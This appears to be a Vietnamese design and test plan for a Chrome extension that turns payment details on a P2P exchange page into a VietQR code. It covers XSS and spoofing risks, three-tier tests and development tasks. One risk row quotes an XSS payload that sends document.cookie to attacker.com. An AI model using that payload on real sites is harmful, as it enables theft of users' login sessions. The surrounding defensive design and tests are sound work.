| `RISK-04` | **Lỗ hổng DOM XSS qua `overlay.innerHTML` (`Cross-Site Scripting in Content Script`)**: Dòng 180-199 của `content.js` gán trực tiếp `overlay.innerHTML = ... ${accountName} ... ${addInfo} ...`. Nếu trên trang web, tên người dùng hoặc nội dung ghi chú chứa `<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">`, đoạn mã độc sẽ thực thi ngay lập tức trong ngữ cảnh của trang sàn giao dịch khi người dùng nhấn `Ctrl+Shift+Q`. | Đánh cắp phiên đăng nhập / dữ liệu nhạy cảm trên trình duyệt của người dùng. | **Chốt chặn trong `qrOverlayUiService.js`**:<br>1. **Cấm tuyệt đối sử dụng `innerHTML`** với dữ liệu động.<br>2. Toàn bộ các trường `accountName`, `bankName`, `accountNo`, `amount`, `addInfo` phải được gán qua thuộc tính `.textContent` của các thẻ DOM tạo bằng `document.createElement()`. |

---

## PHẦN 4 — KẾ HOẠCH KIỂM THỬ 3 TẦNG & BẰNG CHỨNG QA (`test_engineer` & `qa_reviewer`)

### 4.1. Kịch Bản Kiểm Thử 3 Tầng (`Given / When / Then`)

#### Tầng 1: Happy Paths (Luồng Nghiệp Vụ Chuẩn Trên `index.html` Thực Tế)
- **`TEST-T1-001` (Trích xuất chính xác 100% từ mẫu DOM thực tế `idea/bank-qr-extension/index.html`)**:
  - **Given**: Nạp cây DOM từ file [index.html](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/index.html) (`Bạn thanh toán: ₫ 220,000.00`, `Nội dung chuyển khoản: 22862005097425145856`, `Họ và tên: NGUYEN ÐUC SON`, `Tên ngân hàng: MB`, `Số tài khoản/Số thẻ: 000515858888`, `Nội dung chuyển khoản đề xuất: Nội dung chuyển khoản bắt buộc là mã lệnh bên dưới`).
  - **When**: Gọi `extractAndValidatePaymentInfo()` và `renderSafeQrOverlayModal()`.
  - **Then**:
    - `amountVnd === "220000"` (cắt đúng `.00`, không biến thành `22000000`).
    - `accountNo === "000515858888"`.
    - `accountName === "NGUYEN ÐUC SON"`.
    - `bankCode === "MB"`.
    - `addInfo === "22862005097425145856"` (lấy đúng mã lệnh, không lấy nhầm dòng `"Nội dung chuyển khoản đề xuất"`).
    - URL VietQR sinh ra đúng chuẩn: `https://img.vietqr.io/image/MB-000515858888-print.png?amount=220000&addInfo=22862005097425145856&accountName=NGUYEN%20%C3%90UC%20SON`.

#### Tầng 2: Negative / Security / Spoofing (Luồng Lỗi & Chống Giả Mạo)
- **`TEST-T2-001` (Chặn đứng giả mạo Số tài khoản trong khung Chat P2P hoặc phần tử ẩn)**:
  - **Given**: Phía trên bảng lệnh chính có một thẻ `<div class="p2p-chat-box">` (hoặc `<div style="display:none">`) chứa dòng `"Số tài khoản/Số thẻ: 999999999999"` do kẻ gian gửi, còn bảng lệnh chính bên dưới có `"Số tài khoản/Số thẻ: 000515858888"`.
  - **When**: Chạy `extractAndValidatePaymentInfo()`.
  - **Then**: Bộ lọc `isElementSafeAndVisible()` bỏ qua hoàn toàn phần tử trong `.p2p-chat-box` và phần tử ẩn, trích xuất đúng số tài khoản `000515858888` của bảng lệnh chính.
- **`TEST-T2-002` (Chặn tạo QR khi đơn vị tiền tệ là USD / USDT)**:
  - **Given**: Dòng `"Bạn thanh toán"` hiển thị `"$ 220.00"` hoặc `"220.00 USDT"`.
  - **When**: Chạy `extractAndValidatePaymentInfo()`.
  - **Then**: Trả về `isValid = false` với mã lỗi `ExtractionErrorCode.UNSUPPORTED_CURRENCY`, hiển thị Modal cảnh báo ngoại tệ thay vì tạo QR `220 VND`.
- **`TEST-T2-003` (Chống tấn công DOM XSS qua trường `Họ và tên` hoặc `Nội dung`)**:
  - **Given**: Trường `"Họ và tên"` trên DOM chứa chuỗi độc hại `<img src=x onerror="window.__xssExecuted=true">`.
  - **When**: Gọi `renderSafeQrOverlayModal()`.
  - **Then**: `window.__xssExecuted` vẫn là `undefined`, chuỗi `<img src=x...>` chỉ được hiển thị dưới dạng văn bản thuần (`textContent`) bên trong Modal.

#### Tầng 3: Boundary / Edge / Idempotency (Biên Độ & Chống Chồng Lớp)
- **`TEST-T3-001` (Không khớp nhầm tên ngân hàng ngắn `"MB"` với `"CIMB"`, `"EXIMBANK"`, `"KAMBANK"`)**:
  - **Given**: Kiểm thử toàn bộ các tên ngân hàng dễ gây xung đột: `"CIMB"`, `"Eximbank"`, `"MB"`, `"MB Bank"`, `"Ngân hàng Quân Đội"`, `"Ngân hàng Bản Việt"`, `"UnknownSuperBank"`.
  - **When**: Gọi `resolveBankCodeDeterministically()`.
  - **Then**: `"CIMB" -> "CIMB"`, `"Eximbank" -> "EIB"`, `"MB" -> "MB"`, `"Ngân hàng Bản Việt" -> "VCCB"`, và `"UnknownSuperBank" -> null` (không đoán mò).
- **`TEST-T3-002` (Xử lý chuẩn các định dạng số tiền Việt Nam và Quốc tế)**:
  - **Given**: Các chuỗi số tiền biên: `"₫ 220,000.00"`, `"15.500.000 ₫"`, `"1,250,000 VND"`, `"50.000.000,00 VND"`.
  - **When**: Gọi `parseStrictVndAmount()`.
  - **Then**: Trả về chính xác lần lượt `"220000"`, `"15500000"`, `"1250000"`, `"50000000"`.
- **`TEST-T3-003` (Bấm `Ctrl+Shift+Q` 5 lần liên tiếp & Đóng bằng phím `Escape`)**:
  - **Given**: Modal QR đang mở trên trang.
  - **When**: Kích hoạt tiếp 4 lần tạo QR rồi nhấn phím `Escape`.
  - **Then**: Trong `document.querySelectorAll("#bank-qr-extension-overlay")` tại mọi thời điểm chỉ có tối đa `1` phần tử, và sau khi nhấn `Escape` thì phần tử đó cùng các viền highlight trên trang được gỡ bỏ sạch sẽ (`0` phần tử).

---

### 4.2. Quy Trình Kiểm Chứng 5 Bước (`Launch -> Doctor -> Drive -> Evidence -> Cleanup`)

1. **Bước 1 — `Launch`**: Khởi tạo môi trường kiểm thử DOM (Node.js + `jsdom` hoặc Headless Browser) nạp trực tiếp file mẫu thực tế [index.html](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/index.html).
2. **Bước 2 — `Doctor`**: Kiểm tra tính hợp lệ của `manifest.json` (Manifest V3), `settings.json` và cú pháp JavaScript (`node --check`) cho toàn bộ các file helper/service/content/background.
3. **Bước 3 — `Drive`**: Thực thi bộ kiểm thử tự động 3 tầng (`TEST-T1-001` đến `TEST-T3-003`) kiểm chứng bóc tách trên `index.html`, chống giả mạo khung chat, chống XSS và định dạng số tiền.
4. **Bước 4 — `Evidence`**: Lưu kết quả pass 100% của bộ test, chuỗi URL VietQR sinh ra từ `index.html` và cấu trúc DOM của `#bank-qr-extension-overlay`.
5. **Bước 5 — `Cleanup`**: Dọn dẹp các file tạm phục vụ test, đảm bảo thư mục extension sẵn sàng `Load unpacked` trực tiếp vào Chrome.

---

## PHẦN 5 — DANH SÁCH ATOMIC TASKS CHO DEV & TESTER LÀM NGAY (`orchestrator`)

| Mã Task | Role Phụ Trách | File Mục Tiêu (1 File / Module) | Hàm / Thành Phần Cần Viết | Phụ Thuộc | Lệnh Verify & Definition of Done (DoD) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `TASK-001` | `developer` | `idea/bank-qr-extension/settings.json` & `src/constants.js` | Tạo `settings.json` chứa toàn bộ `labels`, `bank_map`, `security`, `vietqr` và định nghĩa các hằng số `OVERLAY_DOM_ID`, `ExtractionErrorCode` trong `src/constants.js`. | Không | **Verify**: `node --check src/constants.js`<br>**DoD**: Không còn bất kỳ từ khóa hay `BANK_MAP` hardcode rải rác trong code logic. |
| `TASK-002` | `developer` | `idea/bank-qr-extension/src/helpers/settingsLoaderServiceHelper.js` | Viết `getExtensionSettings()` nạp cấu hình chuẩn từ `settings.json` cho cả môi trường Content Script và môi trường Unit Test. | `TASK-001` | **Verify**: `node --test tests/settingsLoader.test.js`<br>**DoD**: Trả về đầy đủ `labels`, `bank_map`, `security` đã đóng băng (`Object.freeze`). |
| `TASK-003` | `developer` | `idea/bank-qr-extension/src/helpers/domExtractorServiceHelper.js` | Viết `isElementSafeAndVisible()` (chặn vùng chat, phần tử ẩn) và `findValueByLabelInDom()` trả về cả `text` lẫn `sourceElement`. | `TASK-001` | **Verify**: `node --test tests/domExtractorHelper.test.js`<br>**DoD**: Trích xuất đúng trên `index.html` và bỏ qua 100% nhãn giả mạo nằm trong `.chat-box` hoặc phần tử ẩn. |
| `TASK-004` | `developer` | `idea/bank-qr-extension/src/helpers/paymentParserServiceHelper.js` | Viết `parseStrictVndAmount()`, `resolveBankCodeDeterministically()` (khớp từ dài trước + word boundary) và `buildVietQrImageUrl()`. | `TASK-001` | **Verify**: `node --test tests/paymentParserHelper.test.js`<br>**DoD**: Xử lý đúng `₫ 220,000.00 -> 220000`, chặn `$ 220.00`, không bao giờ khớp nhầm `MB` với `CIMB`/`Eximbank`. |
| `TASK-005` | `developer` | `idea/bank-qr-extension/src/services/paymentExtractionService.js` | Viết `extractAndValidatePaymentInfo()` điều phối việc bóc tách 5 trường, kiểm tra miền tin cậy, cảnh báo giao dịch `>= 50M VND` và đánh dấu `data-bank-qr-source` lên DOM gốc. | `TASK-003`, `TASK-004` | **Verify**: `node --test tests/paymentExtractionService.test.js`<br>**DoD**: Trả về `ValidationOutcome` đầy đủ, chính xác trên DOM của `index.html`. |
| `TASK-006` | `developer` | `idea/bank-qr-extension/src/services/qrOverlayUiService.js` | Viết `renderSafeQrOverlayModal()` và `removeExistingQrOverlay()` dựng UI hoàn toàn bằng `document.createElement` + `textContent` (không dùng `innerHTML`), hỗ trợ nút Copy từng dòng và đóng bằng phím `Esc`. | `TASK-001`, `TASK-005` | **Verify**: `node --test tests/qrOverlayUiService.test.js`<br>**DoD**: Chống tuyệt đối DOM XSS, không tạo chồng nhiều overlay khi gọi liên tiếp. |
| `TASK-007` | `developer` | `idea/bank-qr-extension/content.js`, `background.js` & `manifest.json` | Cập nhật `manifest.json` và `background.js` (bổ sung `chrome.action.onClicked` bên cạnh `Ctrl+Shift+Q`) để nạp các module helper/service và thực thi `content.js`. | `TASK-002`, `TASK-005`, `TASK-006` | **Verify**: `node --check background.js && node --check content.js`<br>**DoD**: Extension hoạt động trơn tru khi nhấn `Ctrl+Shift+Q` hoặc click icon trên thanh công cụ. |
| `TASK-008` | `test_engineer` | `idea/bank-qr-extension/tests/e2eBankQrExtension.test.js` | Viết bộ kiểm thử tự động 3 tầng (`TEST-T1-001`..`TEST-T3-003`) chạy trực tiếp trên file mẫu `index.html`. | `TASK-007` | **Verify**: `node --test tests/e2eBankQrExtension.test.js`<br>**DoD**: Pass 100% tất cả test cases 3 tầng, hoàn tất quy trình 5 bước `Launch -> Doctor -> Drive -> Evidence -> Cleanup`. |
